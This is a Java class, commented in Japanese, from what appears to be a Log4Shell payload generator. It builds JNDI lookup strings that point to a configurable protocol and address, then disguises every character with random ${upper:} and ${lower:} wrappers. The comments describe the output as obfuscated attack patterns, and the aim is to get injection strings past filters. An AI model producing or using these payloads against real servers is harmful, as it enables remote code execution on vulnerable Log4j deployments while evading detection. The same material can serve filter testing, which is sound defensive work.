package org.yuudai;

import org.jetbrains.annotations.NotNull;

/**
 * ${upper:}や${lower:}を使って難読化された攻撃パターンを生成するクラス
 */
class UpperLowerObfuscator extends Obfuscator {
    static final String[] parts = {"${lower:*}", "${upper:*}", "*"};

    /**
     * 難読化前の攻撃パターンを生成するメソッド
     * @return 難読化を行う前の攻撃パターン（先頭の"${"と最後の"}"を除く）
     */
    protected @NotNull String GenerateTargetString() {
        return jndi + ObfuscatorUtils.SelectRandom(proto) + "://" + address;
    }

    /**
     * 難読化された攻撃パターンを生成するメソッド
     * @return ${upper:}と${lower:}によって難読化された攻撃パターン
     */
    @Override
    protected @NotNull String GenerateObfuscatedString() {
        return first + UpperLowerObfuscation(GenerateTargetString()) + "}";
    }

    /**
     * 難読化を行うメソッド
     * @param target 難読化を行う前の攻撃パターン
     * @return 難読化された攻撃パターン
     */

    private @NotNull String UpperLowerObfuscation(@NotNull String target) {
        StringBuilder builder = new StringBuilder();
        for (char c:target.toCharArray()) {
            builder.append(ObfuscatorUtils.SelectRandom(parts).replace('*', c));
        }
        return builder.toString();
    }
}
